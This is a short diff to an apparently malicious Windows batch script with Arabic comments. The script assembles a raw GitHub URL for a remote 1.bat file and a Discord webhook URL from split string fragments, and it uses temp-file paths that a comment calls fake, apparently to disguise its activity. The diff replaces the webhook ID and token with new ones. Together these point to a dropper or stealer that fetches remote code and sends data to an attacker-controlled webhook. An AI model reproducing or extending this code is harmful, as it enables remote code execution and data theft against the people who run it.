@@ -16,10 +16,11 @@ set "H_GIT=raw.githubusercontent.com"
 set "B_PATH=/857seif/11111111/main/1.bat"
 set "G_URL=!PROT!!H_GIT!!B_PATH!"
 
-:: رابط الـ Webhook مقطع
+:: --- تحديث رابط الـ Webhook الجديد هنا ---
 set "H_DIS=discord.com"
-set "W_PATH=/api/webhooks/1461392959575687240/LwVE9O2alP5eDdU9fvRH6X1awl_C6g-SISy6RRNOPHXe2O7VXP3Jb3MBmmeQcQck9D-G"
+set "W_PATH=/api/webhooks/1483864326359220454/0GYczBv6_DBflqxCxIjNf1dp2Z2apLd7BsjLI7GRY92Y3gSwcSrn0ajKiF3pltmMYXC9"
 set "W_URL=!PROT!!H_DIS!!W_PATH!"
+:: ---------------------------------------
 
 :: مسارات وهمية
 set "O_FILE=%TEMP%\win_log_%RANDOM%.tmp"
